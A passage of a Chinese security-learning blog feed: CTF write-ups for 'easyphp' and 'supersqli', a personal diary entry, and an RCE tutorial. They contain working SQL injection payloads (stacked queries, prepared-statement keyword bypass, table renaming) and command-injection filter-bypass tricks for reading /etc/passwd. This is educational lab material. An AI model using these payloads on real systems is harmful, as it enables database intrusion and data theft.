class="line">isset() 判断参数的值是否存在</span><br><span class="line">intval()用于获取变量的整数值</span><br><span class="line">strlen()判断参数长度</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-intval-function.html">intval()函数</a></p></li></ol><p>函数的作用搞清楚后，接下来便是弄清楚符合的条件。<br>既要参数a的值大于600000又要长度小于3，那么只能用科学计数法。<br>当a&#x3D;1e5时，十进制数值为10000<br>由此可知，参数a的选值可以为:1e7&#x2F;8&#x2F;9</p><ol start="3"><li>参数b的要求<br>我们重点看这段源代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr 返回字符串的一部分</span><br><span class="line">md5 计算括号内参数的md5值</span><br></pre></td></tr></table></figure><a href="https://www.runoob.com/php/func-string-substr.html">substr()函数</a></li></ol><p>这段代码翻译过来意思为：<br>参数b的md5值的最后6位是否全等于’8b184b’。<br>这种情况我们用手算是无法计算的，于是需要用PHP写一个简单的脚本来获取符合条件的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终得出参数b的值为：53724</p><ol start="4"><li>参数c的要求<br>我们重点看这段代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>确定c[“m”]的值<br>通过代码可知，我们需要json格式的参数c。<br>参数c需要满足数组格式，且c[“m”]的类型不能为数字类型，且c[“m”]的值需要大于2022。<br>我们知道在php中，当字符串的首位为字符，并与整数比较时，字符串的值会转化为0，举例而言就是’a123’会变成0；<br>但是当字符串首位为数字，并与整数比较时，此时字符串会将字符之前的数字与整数比较，比如：’1a23’会变为1，’123a’会变为123</li></ul><p>于是我们可以构造出c[“m”]的值为：12345a</p><ul><li>确定c[“n”]的值<br>通过代码可知c[“n”]的类型为数组，且数组中有2个值，且c[“n”][0]的类型也是数组。大致为[[x,x,…],x]<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_search 在数组中搜索某个键值，并返回对应的键名</span><br></pre></td></tr></table></figure><a href="https://www.runoob.com/php/func-array-search.html">array_search()函数</a><br>可知该函数是查找值相同的元素，那么类型不同也可以。<br>那么此时就产生了两种可选的值：0或’DGGJ’<br>但由于下面的foreach不能与DGGJ匹配，因此我们只能选0<br>因此c[“n”]的值为：[[0,2],0]</li></ul><p>最终payload为：<br><code>/?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;12345a&quot;, &quot;n&quot;:[[0,2],0]&#125;</code><br>提交得到flag。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这道题倒是让我受到不少收获，感觉蛮好。是我应该会却不会的内容，代码审计能力提升了~</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_46906325/article/details/127154789">攻防世界web新手区easyphp题解writeup</a><br><a href="https://blog.csdn.net/qq_56426046/article/details/127194240?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-127194240-blog-127154789.pc_relevant_3mothn_strategy_recovery&spm=1001.2101.3001.4242.1&utm_relevant_index=3">攻防世界easyphp解题wp</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;做了这题才知道自己的php掌握的有多么糟糕…&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界_supersqli</title>
    <link href="http://example.com/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_supersqli/"/>
    <id>http://example.com/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_supersqli/</id>
    <published>2022-12-10T16:00:00.000Z</published>
    <updated>2022-12-11T09:07:25.841Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做的CTF题目，虽然简单，但由于我已经很久没碰SQL注入的东西了，忘得七七八八，导致做不出来。</p><span id="more"></span><h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界 -&gt; supersqli</p><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>初步尝试<br><code>1&#39;</code> 出现了报错，并且根据报错信息可知，就是使用1’注入<br><code>1&#39; order by 2#</code> 可知列数为2<br><code>1&#39; union select 1,2 #</code> 发现遇到一个报错：<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>尝试大小写，双写，注释符，内联等绕过方式后均无果，于是考虑别的办法</p></li><li><p>堆叠注入<br>在多次尝试后，选择堆叠注入。<br><code>1&#39;;show databases; --+</code><br>成功显示数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables; --+</span><br><span class="line"></span><br><span class="line">成功显示表名：</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对每个表名查询字段，查询字段时需要将表名用反引号（`）括起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `words`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面查询可知，我们所需的flag在表名为“1919810931114514”当中。<br>接下来就是如何获取到该字段</p></li><li><p>获取flag</p></li></ol><ul><li><p>方法1：预编译<br><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">预编译的知识</a><br>简单来说有三步：<br>set @xxx &#x3D; 需要查询的语句;<br>prepare stmt from @xxx;<br>execute stmt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure><p>即可获得flag</p></li><li><p>方法2：改表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure><p>改好后再通过这个语句查询：<br><code>1&#39; or 1=1 #</code><br>即可获得flag</p></li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好好学习，天天向上</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">攻防世界-supersqli详解</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;第一次做的CTF题目，虽然简单，但由于我已经很久没碰SQL注入的东西了，忘得七七八八，导致做不出来。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="SQL注入" scheme="http://example.com/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="堆叠注入" scheme="http://example.com/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>不知老之将至</title>
    <link href="http://example.com/2022/12/10/Diary_1202/"/>
    <id>http://example.com/2022/12/10/Diary_1202/</id>
    <published>2022-12-09T16:00:00.000Z</published>
    <updated>2022-12-10T18:16:49.592Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E8%99%B9%E5%A4%8F_1.png" alt="虹夏"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好多天没写了，主要是因为懒吧。今天也很迟了，还是要写，不能一直松懈下去。</p><h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>发愤忘食，乐以忘忧，不知老之将至云尔。<br>--孔子</p><h1 id="孔子的英文"><a href="#孔子的英文" class="headerlink" title="孔子的英文"></a>孔子的英文</h1><p>近来看到孔子的一句英文，但我实在想不起对应的中文原文是什么了，按理说应该有名啊，这里暂且写一下英文：<br>Our greatest glory is not in never falling, but in rising every time we fall.<br>以后有意再找找吧。</p><h1 id="记录近况"><a href="#记录近况" class="headerlink" title="记录近况"></a>记录近况</h1><p>约莫有十天没写了吧，从我因为住的楼里出现新冠阳性，到我从小道溜出学校住亲戚家，再到全校自愿返家，人走的差不多，最后寝室唯我一人。<br>大致上就是如此吧，流水账不必多言。</p><h1 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h1><p>由于六级推迟至明年3月初，我也从备考六级中解放出来，用更多精力去看web安全方面的内容。<br>不过学得太浅了，怎么说呢？看视频和博客，再自己写博客。也没怎么练习，很多东西一知半解，让我觉得轻飘飘的，看似把知识学进脑中，实则什么也不会。这种感觉很不好受。<br>还是需要，看视频，毕竟这样印象要深一些，而且必须要多进行实际练习，比如ctf，漏洞复现之类的。我将把大部分精力都放在实际练习上，知识的东西如果不会有效运用，终究是无趣的教条。<br>一个人住在寝室里，感觉自己就像在闭关修炼，其实感觉还不错？</p><h1 id="幸福的联系"><a href="#幸福的联系" class="headerlink" title="幸福的联系"></a>幸福的联系</h1><p>今天有人向我寻求问题的解答，大致是关于恋爱的事。<br>说着说着就谈到了幸福的问题。那人认为，幸福是每个人自己的，也即每个人的幸福是分开的，并不具有很强的联系。如果自己的幸福最大化，常常也会减损他人的幸福，也即是一种互斥的关系。<br>可在我看来，只有自己幸福最大化，才能让身边的人幸福。越是亲近的人，越会因我的幸福而变得幸福。也就是说，每个人的幸福之间具有很强的联系。倘若让他人伴我共赴地狱能使我幸福，那我会毫不犹豫邀请。因为我的幸福，即为我亲近之人的幸福。<br>常见的例子还有父母与孩子之间，孩子的幸福是父母的幸福。<br>但这个问题也是一个复杂的问题，比如身边的人关系亲疏是到什么程度，才会符合自己的幸福会给他人带来幸福？还有是些什么样的情形才符合？很多方面仍需思考，还不成熟。慢慢思考，以后专门写一篇文章吧。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我们都在等待，等待着别人来拯救我们自己。 --列夫·托尔斯泰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E8%99%B9%E5%A4%8F_1.png&quot; alt=&quot;虹夏&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>RCE漏洞</title>
    <link href="http://example.com/2022/12/10/RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2022/12/10/RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-12-09T16:00:00.000Z</published>
    <updated>2022-12-11T09:17:48.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到RCE了，感觉在漏洞中会很常见。</p><span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE（remote command&#x2F;code execute），远程命令&#x2F;代码执行。RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。比如常见的路由器，防火墙，入侵检测等设备的web管理界面上。一般会给用户提供ping操作的web界面。<br>用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交不符合预期的命令，并让后台执行，从而控制整个后台服务器。<br>现在很多企业开始实施自动化运维，大量系统操作会通过“自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行漏洞。远程代码执行 同样的道理，因为需求设计，后台有时也会把用户的输入作为代码的一部分执行，也就造成RCE漏洞。比如代码执行的函数，不安全的反序列化等等。<br>因此，如果需要给前端用户提供操作类的API接口，一定要对接口输入的内容进行严格判断，比如实施严格的白名单策略会是一个比较好的办法。</p><h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="代码层过滤不严"><a href="#代码层过滤不严" class="headerlink" title="代码层过滤不严"></a>代码层过滤不严</h2><p>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：</p><pre><code>system(&quot;/bin/program --arg $arg&quot;);</code></pre><h2 id="系统漏洞造成命令注入"><a href="#系统漏洞造成命令注入" class="headerlink" title="系统漏洞造成命令注入"></a>系统漏洞造成命令注入</h2><pre><code>比如：bash破壳漏洞（CVE-2014-6217）</code></pre><h2 id="调用的第三方组件存在代码执行漏洞"><a href="#调用的第三方组件存在代码执行漏洞" class="headerlink" title="调用的第三方组件存在代码执行漏洞"></a>调用的第三方组件存在代码执行漏洞</h2><pre><code>如wordpress中用来处理图片的imageMagick组件Java中的命令执行漏洞（struts2/ElasticsearchGroovy等）ThinkPHP5.x的命令执行</code></pre><h1 id="命令执行漏洞的利用条件"><a href="#命令执行漏洞的利用条件" class="headerlink" title="命令执行漏洞的利用条件"></a>命令执行漏洞的利用条件</h1><ol><li>开发人员调用了能够执行系统命令的函数</li><li>这个函数的参数可控（即用户能够控制）</li><li>开发人员没有对该函数的参数进行过滤或过滤不严</li></ol><h1 id="可能存在命令执行漏洞的函数（PHP）"><a href="#可能存在命令执行漏洞的函数（PHP）" class="headerlink" title="可能存在命令执行漏洞的函数（PHP）"></a>可能存在命令执行漏洞的函数（PHP）</h1><h2 id="利用系统函数实现命令执行的函数"><a href="#利用系统函数实现命令执行的函数" class="headerlink" title="利用系统函数实现命令执行的函数"></a>利用系统函数实现命令执行的函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(), assert(), preg_replace(), call_user_func()</span><br></pre></td></tr></table></figure><p>如果页面存在以上函数且对用户输入没有作严格过滤，那么可能会造成远程命令执行漏洞，除此之外还有其它函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ob_start(), unserialize(), creat_function(), uasort(), uksort(), array_filter(), array_reduce()</span><br></pre></td></tr></table></figure><h2 id="直接执行系统命令的代码函数"><a href="#直接执行系统命令的代码函数" class="headerlink" title="直接执行系统命令的代码函数"></a>直接执行系统命令的代码函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(), exec(), shell_exec(), passthru(), pcntl_exec(), popen(), proc_open(), 反引号</span><br></pre></td></tr></table></figure><h1 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h1><p>命令拼接符号可以连接多个命令，恶意命令通常拼接在正常命令后面。</p><h2 id="Windows的系统命令拼接符"><a href="#Windows的系统命令拼接符" class="headerlink" title="Windows的系统命令拼接符"></a>Windows的系统命令拼接符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">拼接符 示例 解释</span><br><span class="line">&amp; A&amp;B 无论A是false还是true，B都执行。即互不影响</span><br><span class="line">&amp;&amp; A&amp;&amp;B 具有短路效果，A是false，B就不执行</span><br><span class="line">| A|B 表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行</span><br><span class="line">|| A||B 表示A命令语句执行失败，然后才执行B命令语句</span><br></pre></td></tr></table></figure><h2 id="Linux的系统命令拼接符"><a href="#Linux的系统命令拼接符" class="headerlink" title="Linux的系统命令拼接符"></a>Linux的系统命令拼接符</h2><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>&amp;的作用是使命令在后台执行。只要在命令后面跟上一个空格和&amp;，可以一口气在后台运行多个命令。需要停止，就是kill -s 进程号。如下所示：<br><img src="/simg/rce_1.png" alt=" "></p><h3 id=""><a href="#" class="headerlink" title=";"></a>;</h3><p>分号（;）作用是进行多条命令的无关联执行，每一条执行结果互不影响，示例如下：<br><img src="/simg/rce_2.png" alt=" "></p><h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>&amp;&amp;的用法和功能与Windows相同，都是左边成功右边才能执行。</p><h3 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h3><p>||的用法和功能与Windows相同，都是前面执行失败才执行后面。</p><h3 id="-2"><a href="#-2" class="headerlink" title="()"></a>()</h3><p>如果想执行几条命令，则需要用命令分隔符分号隔开每条命令，并使用圆括号()把所有命令组合起来，示例如下：<br><img src="/simg/rce_3.png" alt=" "></p><h2 id="常用命令总述"><a href="#常用命令总述" class="headerlink" title="常用命令总述"></a>常用命令总述</h2><p>使用时不要局限于单个的，简单的用法，因为很多过滤参数的方式都是识别对应的拼接符，所以要思维变通，很多时候，大量拼接符层层嵌套往往会有出其不意的效果<br>    比如上面这个圆括号的使用例子，意思就是当echo 1 执行成功后会执行后面的命令，把echo 1输出到 11.txt ，然后复制11.txt到根目录。 结合||和&amp;&amp;可以实现复杂的功能。</p><h1 id="常用绕开防护的方法"><a href="#常用绕开防护的方法" class="headerlink" title="常用绕开防护的方法"></a>常用绕开防护的方法</h1><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ul><li>常见通配符如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号 含义</span><br><span class="line">? 匹配单个字符，匹配多个字符需要多个?连用</span><br><span class="line">* *代表任意数量的字符</span><br><span class="line">[] 代表一定有一个在括号内的字符（非任意字符），例如[abcd]代表一定有一个字符，可能是a,b,c,d这四个中任何一个</span><br></pre></td></tr></table></figure></li><li>使用示例：<br>一个常用的读取密码命令如下：<br><code>cat /etc/passwd</code><br>可以搭配多种通配符使用。<br>使用?通配符后，可能会有多种变化，比如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /?tc/?as?wd</span><br><span class="line">cat /*tc/*as*wd</span><br></pre></td></tr></table></figure></li></ul><h2 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h2><ul><li>常见连接符<br><code>单引号（&#39;）双引号（&quot;）反斜杠（\）  如：/&#39;b&#39;i&#39;n&#39;/&#39;c&#39;a&#39;t/&#39;e&#39;t&#39;c&#39;/&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</code></li><li>使用示例：<br><img src="/simg/rce_4.png" alt=" "></li></ul><h2 id="未初始化变量"><a href="#未初始化变量" class="headerlink" title="未初始化变量"></a>未初始化变量</h2><ul><li>简介<br>未初始化的变量值都是null，例如a,a,a,b，在Linux环境下都输出为null，所以可以用未初始化变量加在一些命令的末尾，来绕过一些黑名单。</li><li>使用示例<br><code>cat$a /etc$a/passwd$a</code><br><img src="/simg/rce_5.png" alt=" "></li></ul><h1 id="常见位置"><a href="#常见位置" class="headerlink" title="常见位置"></a>常见位置</h1><p>各种cms框架的命令执行漏洞是最多的，着重在这些地方找。除此之外就是插件位置，插件因为各种原因经常也需要执行系统命令。当然其它地方也有。</p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ol><li>各种框架、插件等都可能出现命令执行，升级到新版本，多打补丁</li><li>关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响</li><li>少用框架&#x2F;cms</li><li>可以过滤一些符号从而减少一些危险</li><li>安全配置好php相关参数<br>php配置文件里有个disable_functions的配置，这个禁止某些php函数，服务器便是用这个来禁止php的执行命令函数。<br>例如：disable_functions&#x3D;system,passthru,shell_exec,exec,popen便禁止了用这些函数来执行系统命令</li><li>升级中间件</li><li>严格控制传入变量，严禁使用魔法函数</li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>大多只是看了，没有实际操作，得加强一下实战方面。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_63844103/article/details/126953630?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&utm_relevant_index=2">命令执行漏洞（RCE）详解</a><br><a href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;终于来到RCE了，感觉在漏洞中会很常见。&lt;/p&gt;</summary>
    
    
    
    <category term="RCE" scheme="http://example.com/categories/RCE/"/>
    
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>SSRF服务端请求伪造</title>
    <link href="http://example.com/2022/12/09/SSRF/"/>
    <id>http://example.com/2022/12/09/SSRF/</id>
    <published>2022-12-08T16:00:00.000Z</published>
    <updated>2022-12-09T17:17:38.283Z</updated>
    
